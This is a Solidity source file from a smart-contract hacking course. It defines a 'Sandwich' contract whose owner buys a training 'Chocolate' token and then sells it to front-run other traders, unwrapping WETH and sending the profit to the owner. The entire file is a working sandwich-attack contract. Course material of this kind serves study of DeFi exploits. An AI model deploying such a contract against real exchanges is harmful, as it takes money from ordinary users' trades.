// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IChocolate is IERC20 {
    function swapChocolates(address _tokenIn, uint256 _amountIn) external payable;
}

/**
 * @title Chocolate
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract Sandwich is Ownable {

    IWETH private immutable weth;
    IChocolate private immutable chocolate;

    constructor(address _weth, address _chocolate) {
        weth = IWETH(_weth);
        chocolate = IChocolate(_chocolate);
    }

    // @_isBuy: buy chocolate: true, sell chocolate: false
    function sandwich(bool _isBuy) external payable onlyOwner {

        if(_isBuy) {
            chocolate.swapChocolates{value: msg.value}(address(weth), msg.value);
        } else {
            
            // Approve and sell chocolate tokens
            uint256 chocolateAmount = chocolate.balanceOf(address(this));
            chocolate.approve(address(chocolate), chocolateAmount);
            chocolate.swapChocolates(address(chocolate), chocolateAmount);

            // Unwrap WETH to ETH and send to owner()
            uint256 wethAmount = weth.balanceOf(address(this));
            weth.withdraw(wethAmount);
            
            (bool sent, ) = owner().call{value: address(this).balance}("");
            require(sent, "Failed to send ETH");
        }
    }

    receive() external payable {}

}